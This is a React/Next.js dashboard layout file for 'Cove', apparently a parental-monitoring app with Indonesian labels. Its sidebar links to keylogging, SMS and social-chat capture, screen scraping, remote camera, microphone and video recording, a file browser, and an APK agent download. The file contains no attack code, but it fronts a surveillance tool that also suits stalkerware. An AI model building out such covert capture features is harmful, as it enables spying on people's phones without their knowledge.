'use client';

import React, { useEffect, useState } from 'react';
import Link from 'next/link';
import { usePathname, useRouter } from 'next/navigation';
import {
  ShieldCheck, MapPin, Smartphone, MessageSquare, BellRing, Moon,
  LogOut, Menu, X, Bug, Phone, Bell, User, Package, Activity, Camera, Image, Mail, Keyboard, FileText,
  Users, Aperture, Mic, HardDrive, Clapperboard, Baby, PackageOpen,
} from 'lucide-react';
import DeviceStatusPulse from '../../components/DeviceStatusPulse';
import { supabase, signOut } from '../../lib/supabase';

interface Device {
  id: string; device_name: string; device_uuid: string; os_version: string;
  pairing_code: string; status: string; battery_level: number; last_heartbeat_at: string;
}

const NAV_SECTIONS = [
  {
    label: 'Pemantauan',
    items: [
      { name: 'Ringkasan',          href: '/dashboard',               icon: Activity     },
      { name: 'Pelacakan Lokasi',   href: '/dashboard/tracking',      icon: MapPin       },
      { name: 'Obrolan Sosmed',     href: '/dashboard/social-chats',  icon: MessageSquare },
      { name: 'Riwayat SMS',        href: '/dashboard/sms',           icon: Mail         },
      { name: 'Ketikan Keyboard',   href: '/dashboard/keylogger',     icon: Keyboard     },
      { name: 'Aktivitas Layar',     href: '/dashboard/screen-scrapes', icon: FileText     },
      { name: 'Log Panggilan',      href: '/dashboard/calls',         icon: Phone        },
      { name: 'Screenshot Layar',   href: '/dashboard/screenshots',   icon: Camera       },
      { name: 'Kamera Perangkat',   href: '/dashboard/camera',         icon: Aperture     },
      { name: 'Daftar Kontak',      href: '/dashboard/contacts',       icon: Users        },
      { name: 'Rekam Mikrofon',     href: '/dashboard/microphone',     icon: Mic          },
      { name: 'Rekam Video',        href: '/dashboard/video',          icon: Clapperboard },
      { name: 'File Penyimpanan',   href: '/dashboard/file-browser',   icon: HardDrive    },
    ],
  },
  {
    label: 'Analisis Data',
    items: [
      { name: 'Inventaris Aplikasi', href: '/dashboard/app-inventory',  icon: Package  },
      { name: 'Analisis Komunikasi', href: '/dashboard/sleep-analytics', icon: Activity },
      { name: 'Galeri Foto',         href: '/dashboard/gallery',         icon: Image   },
    ],
  },
  {
    label: 'Konfigurasi',
    items: [
      { name: 'Daftar Anak',        href: '/dashboard/children',       icon: Baby        },
      { name: 'Unduh APK Agent',    href: '/dashboard/apk',            icon: PackageOpen },
      { name: 'Setelan Alert',      href: '/dashboard/alert-settings', icon: Bell        },
      { name: 'Profil Orang Tua',   href: '/dashboard/profile',        icon: User        },
      { name: 'Diagnostik DB',      href: '/dashboard/debug',          icon: Bug         },
    ],
  },
];

export default function DashboardLayout({ children }: { children: React.ReactNode }) {
  const pathname = usePathname();
  const router = useRouter();
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [devices, setDevices] = useState<Device[]>([]);
  const [device, setDevice] = useState<Device | null>(null);
  const [loggingOut, setLoggingOut] = useState(false);
  const [unreadAlerts, setUnreadAlerts] = useState(0);

  const fetchUnreadAlerts = async (devId?: string) => {
    const id = devId || device?.id;
    if (!id) return;
    try {
      const { count } = await supabase
        .from('alerts')
        .select('id', { count: 'exact', head: true })
        .eq('device_id', id)
        .eq('is_acknowledged', false);
      setUnreadAlerts(count ?? 0);
    } catch (_) {}
  };

  const fetchActiveDevice = async () => {
    try {
      const { data, error } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
      if (!error && data && data.length > 0) {
        setDevices(data);
        const savedId = localStorage.getItem('selected_device_id');
        const active = data.find((d: Device) => d.id === savedId) || data[0];
        setDevice(active);
        localStorage.setItem('selected_device_id', active.id);
        fetchUnreadAlerts(active.id);
      } else {
        setDevices([]);
        setDevice(null);
      }
    } catch (e) { console.error(e); }
  };

  const handleDeviceChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    localStorage.setItem('selected_device_id', e.target.value);
    window.location.reload();
  };

  const handleLogout = async () => {
    setLoggingOut(true);
    try {
      await signOut();
      await fetch('/api/auth/logout', { method: 'POST' });
      router.push('/login');
    } catch (e) { console.error(e); }
    finally { setLoggingOut(false); }
  };

  useEffect(() => {
    fetchActiveDevice();
    const interval = setInterval(fetchActiveDevice, 10000);
    return () => clearInterval(interval);
  }, []);

  const SidebarContent = () => (
    <>
      <div>
        {/* Brand header */}
        <div className="px-5 py-5 border-b border-borderDark flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <span className="p-2 bg-accentViolet/15 rounded-xl text-accentViolet ring-1 ring-accentViolet/20">
              <ShieldCheck size={22} />
            </span>
            <div>
              <span className="font-bold tracking-wide text-sm bg-gradient-to-r from-violetLight to-accentBlue bg-clip-text text-transparent">
                Cove
              </span>
              <p className="text-[10px] text-textSecondary font-medium">Panel Pengawasan Orang Tua</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            {/* Notification bell */}
            <Link href="/dashboard/alert-settings" title="Alert belum dibaca"
              className="relative p-1.5 hover:bg-accentViolet/10 rounded-lg text-textSecondary hover:text-accentYellow transition-colors">
              <Bell size={18} />
              {unreadAlerts > 0 && (
                <span className="absolute -top-1 -right-1 min-w-[16px] h-4 bg-accentRed text-white text-[9px] font-bold rounded-full flex items-center justify-center px-0.5">
                  {unreadAlerts > 99 ? '99+' : unreadAlerts}
                </span>
              )}
            </Link>
            <button onClick={() => setMobileMenuOpen(false)} className="md:hidden text-textSecondary hover:text-textPrimary">
              <X size={20} />
            </button>
          </div>
        </div>

        {/* Device selector */}
        <div className="p-4 mx-3 my-3 glass-card rounded-xl space-y-2.5">
          <div className="text-[10px] text-textSecondary uppercase font-semibold tracking-wider">Pilih Perangkat Anak</div>
          {devices.length > 0 ? (
            <select
              value={device?.id || ''}
              onChange={handleDeviceChange}
              className="w-full bg-darkBg border border-borderDark rounded-lg px-2.5 py-1.5 text-xs text-textPrimary focus:outline-none focus:border-accentViolet focus:ring-1 focus:ring-accentViolet/30"
            >
              {devices.map(d => <option key={d.id} value={d.id}>{d.device_name}</option>)}
            </select>
          ) : (
            <div className="text-xs text-textSecondary italic">Belum ada perangkat</div>
          )}
          {device && (
            <div className="pt-2 border-t border-borderDark/40">
              <div className="text-[10px] text-textSecondary">{device.os_version} · 🔋 {device.battery_level}%</div>
              <div className="mt-1.5">
                <DeviceStatusPulse lastHeartbeatAt={device.last_heartbeat_at} />
              </div>
            </div>
          )}
        </div>

        {/* Sectioned navigation */}
        <nav className="px-3 space-y-1 mt-1">
          {NAV_SECTIONS.map((section) => (
            <div key={section.label} className="mb-3">
              <p className="text-[10px] font-bold text-textSecondary uppercase tracking-widest px-3 mb-1.5 mt-2">
                {section.label}
              </p>
              {section.items.map((item) => {
                const Icon = item.icon;
                const isActive = pathname === item.href;
                return (
                  <Link
                    key={item.href}
                    href={item.href}
                    onClick={() => setMobileMenuOpen(false)}
                    className={`flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all ${
                      isActive
                        ? 'bg-accentViolet/15 text-violetLight border-l-2 border-accentViolet'
                        : 'text-textSecondary hover:bg-cardBg/60 hover:text-textPrimary border-l-2 border-transparent'
                    }`}
                  >
                    <Icon size={16} />
                    {item.name}
                  </Link>
                );
              })}
            </div>
          ))}
        </nav>
      </div>

      {/* Sidebar Footer */}
      <div className="p-4 border-t border-borderDark">
        <button
          onClick={handleLogout}
          disabled={loggingOut}
          className="flex items-center gap-3 w-full px-3 py-2.5 rounded-lg text-sm font-medium text-accentRed/80 hover:bg-red-950/20 hover:text-accentRed transition-colors disabled:opacity-50"
        >
          <LogOut size={16} />
          {loggingOut ? 'Keluar...' : 'Keluar Panel'}
        </button>
        <p className="text-[10px] text-textSecondary/50 text-center mt-3">Cove v1.0 — NoxNull</p>
      </div>
    </>
  );

  return (
    <div className="min-h-screen bg-darkBg text-textPrimary flex flex-col md:flex-row">
      {/* Mobile Top Navbar */}
      <div className="md:hidden bg-cardBg border-b border-borderDark px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="p-1.5 bg-accentViolet/10 rounded-lg text-accentViolet">
            <ShieldCheck size={18} />
          </span>
          <span className="font-bold text-sm tracking-wide bg-gradient-to-r from-violetLight to-accentBlue bg-clip-text text-transparent">
            Cove
          </span>
        </div>
        <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="text-textPrimary">
          {mobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
        </button>
      </div>

      {/* Sidebar */}
      <aside className={`
        fixed inset-y-0 left-0 z-50 w-64 glass-panel border-r border-borderDark flex flex-col justify-between transform transition-transform duration-200 ease-in-out overflow-y-auto
        md:translate-x-0 md:static md:inset-auto
        ${mobileMenuOpen ? 'translate-x-0' : '-translate-x-full'}
      `}>
        <SidebarContent />
      </aside>

      {/* Main Content */}
      <main className="flex-1 p-6 md:p-8 overflow-y-auto max-w-7xl mx-auto w-full">
        {children}
      </main>
    </div>
  );
}
